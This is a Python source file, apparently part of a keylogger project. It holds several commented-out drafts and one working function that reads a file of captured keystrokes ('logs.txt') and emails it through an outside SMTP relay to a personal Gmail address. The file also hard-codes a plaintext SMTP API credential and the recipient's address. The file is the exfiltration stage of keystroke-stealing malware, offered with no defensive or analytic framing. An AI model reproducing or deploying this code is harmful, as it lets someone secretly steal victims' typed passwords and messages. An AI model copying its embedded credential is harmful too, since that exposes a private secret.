
# import smtplib


# def sendEmail(log):
#     sender = "Private Person <hello@demomailtrap.com>"
#     receiver = "A Test User <ukharbanda20@gmail.com>"

#     with open(log, "r") as logFile:
#         keyLogs = logFile.read()



#     message = f"""\
#     Subject: Here are the keylogs
#     To: {receiver}
#     From: {sender}

#     opk"""

#     with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
#         server.starttls()
#         server.login("api", "c2151af737bd447f8f82331e58edbda8")
#         server.sendmail(sender, receiver, message)


# import smtplib

# # def sendEmail():
# print("really")
# log_file = "logs.txt"
# with open(log_file, "r") as logFile:
#     keyLogs = logFile.read()

# sender = "Private Person <hello@demomailtrap.com>"
# receiver = "A Test User <ukharbanda20@gmail.com>"

# message = f"""\
# Subject: Hi Mailtrap
# To: {receiver}
# From: {sender}

# {keyLogs}"""

# with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
#     server.starttls()
#     server.login("api", "c2151af737bd447f8f82331e58edbda8")
#     server.sendmail(sender, receiver, message)

# if __name__ == "__main__":
#     try:
#         sendEmail()
    
#     except KeyboardInterrupt:
#         print("done")


# import smtplib

# # def send_email():
#     print("Sending email...")
#     log_file = "logs.txt"
#     with open(log_file, "r") as logFile:
#         keyLogs = logFile.read()

#     sender = "hello@demomailtrap.com"  # Match this with your authenticated account
#     receiver = "ukharbanda20@gmail.com"

#     message = f"""\
#     Subject: Hi Mailtrap
#     To: {receiver}
#     From: {sender}

#     {keyLogs}"""

#     with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
#         server.starttls()
#         server.login("api", "c2151af737bd447f8f82331e58edbda8")
#         server.sendmail(sender, receiver, message)

# send_email()

import smtplib
from email.message import EmailMessage

def sendEmail():
    
    log_file = "logs.txt"
    with open(log_file, "r") as logFile:
        keyLogs = logFile.read()

    sender = "hello@demomailtrap.com"
    receiver = "ukharbanda20@gmail.com"
    
    message = EmailMessage()
    message["Subject"] = "Hi Mailtrap"
    message["From"] = sender
    message["To"] = receiver
    message.set_content(keyLogs)

    try:
        with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
            server.starttls()
            server.login("api", "c2151af737bd447f8f82331e58edbda8")
            server.send_message(message)
        print("Email sent successfully!")
        
    except smtplib.SMTPDataError as e:
        print("SMTP Data Error:", e)
    except smtplib.SMTPException as e:
        print("SMTP Error:", e)
    except Exception as e:
        print("General Error:", e)

if __name__ == "__main__":
    sendEmail()
